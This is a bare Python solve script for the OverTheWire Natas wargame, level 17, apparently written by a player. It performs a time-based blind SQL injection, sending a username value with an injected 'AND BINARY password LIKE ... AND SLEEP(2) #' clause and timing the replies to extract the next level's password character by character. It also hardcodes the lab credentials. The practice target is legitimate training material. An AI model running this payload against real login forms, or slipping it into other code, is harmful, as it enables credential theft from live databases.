import requests
import re
import time
usernaem = "natas17"
password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

character = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

url = "http://%s.natas.labs.overthewire.org/" %usernaem

session = requests.Session()
seen_password = list("8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq")
print(len(seen_password))
while (len(seen_password)<32):
    for ch in character:
        start_time = time.time()
        response = session.post(url,data={"username":'natas18" AND BINARY password LIKE "' + "".join(seen_password)+ch + '%" AND SLEEP(2) #'},auth=(usernaem,password))
        content = response.text
        end_time = time.time()
        difference = end_time-start_time
        print(f'{difference}->{"".join(seen_password)}===>{ch}')
        
        if(difference>=2):
            seen_password.append(ch)
            break

print(str(seen_password))
